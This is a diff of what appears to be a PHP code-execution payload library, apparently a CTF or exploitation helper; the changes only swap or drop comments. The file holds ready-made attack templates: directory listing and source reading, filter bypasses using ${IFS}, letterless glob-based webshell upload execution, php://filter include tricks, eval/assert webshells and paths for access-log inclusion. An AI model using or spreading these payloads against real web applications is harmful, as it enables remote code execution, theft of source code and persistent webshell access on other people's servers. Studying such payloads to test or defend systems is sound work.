@@ -86,12 +86,12 @@ FILE_ENUM_TEMPLATES = [
     "echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));",
 ]
 
-# Variable scope hijacking payload:
+# 变量劫持
 VARIABLE_HIJACK_TEMPLATES = [
     "eval(array_pop(next(get_defined_vars())));",
 ]
 
-# Space Bypass Templates
+# 空格绕过
 SPACE_BYPASS_TEMPLATES = [
     "{payload}".replace(" ", "${IFS}"),
     "{payload}".replace(" ", "$IFS$9"),
@@ -103,20 +103,17 @@ SPACE_BYPASS_TEMPLATES = [
     "{payload}".replace(" ", "%a0"),
 ]
 
-# Upload File
+# 无字母webshell
 UPLOAD_EXEC_TEMPLATES = [
     ". /???/????????[@-[]",
     ". /tmp/php??????",
     ". /var/tmp/php??????",
 ]
 
-# Article final POC wrapper integration
 UPLOAD_EXEC_WRAPPER_TEMPLATES = [
     "?><?=`{cmd}`;?>",
 ]
 
-# Special output trigger payloads:
-# show Egs hint when final payload matches bare or wrapped upload POC.
 SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS = [
     ". /???/????????[@-[]",
     "?><?=`. /???/????????[@-[]`;?>",
@@ -141,7 +138,6 @@ for i in range(1,20):
         print(res.text)
         break"""
 
-# PHP Command Execution Functions
 PHP_EXEC_WRAPPERS = [
     "system",
     "passthru",
@@ -149,19 +145,18 @@ PHP_EXEC_WRAPPERS = [
     "exec",
 ]
 
-# Short Tag Templates
+# 短标签
 SHORT_TAG_TEMPLATES = [
     "<?={payload}?>",
     "<?= {payload} ?>",
 ]
 
-# Backtick Templates
+# 反引号
 BACKTICK_TEMPLATES = [
     "`{path}`",
     "`cat {path}`",
 ]
 
-# Include Templates
 INCLUDE_TEMPLATES = [
     "include $_GET[x];&x=php://filter/read=convert.base64-encode/resource={path}",
     "include('{path}');",
@@ -170,14 +165,13 @@ INCLUDE_TEMPLATES = [
     "require_once('{path}');",
 ]
 
-# Webshell Templates
 WEBSHELL_TEMPLATES = [
     "eval($_GET[x]);&x=system('{cmd}');",
     "assert($_POST[x]);",
     "call_user_func($_GET[x], $_GET[y]);",
 ]
 
-# Log Inclusion Templates
+# 日志
 LOG_INCLUSION_TEMPLATES = [
     "/var/log/nginx/access.log",
     "/var/log/apache2/access.log",
